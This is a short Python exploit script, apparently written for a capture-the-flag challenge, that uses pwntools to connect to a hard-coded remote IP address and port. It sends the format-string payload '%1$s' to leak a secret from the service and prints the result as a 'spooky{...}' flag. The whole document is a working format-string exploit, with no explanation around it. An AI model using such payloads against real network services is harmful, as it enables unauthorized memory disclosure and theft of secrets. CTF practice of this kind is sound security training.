
#!/usr/bin/env python3
from pwn import *

HOST = "18.226.103.146"
PORT = 9002

context.log_level = "info"

def exploit():
    io = remote(HOST, PORT)
    io.recvuntil(b"Input: ")
    io.sendline(b"%1$s")
    response = io.recvall(timeout=5).strip()

    if not response:
        log.failure("No secret received")
        return

    secret = response.splitlines()[0].strip()

    log.success(f"Leaked secret: {secret.decode(errors='replace')}")

    if secret.startswith(b"spooky{") and secret.endswith(b"}"):
        flag = secret
    else:
        flag = b"spooky{" + secret + b"}"

    log.success(f"Flag candidate: {flag.decode(errors='replace')}")

    print(f"\nFLAG: {flag.decode(errors='replace')}")

if __name__ == "__main__":
    exploit()
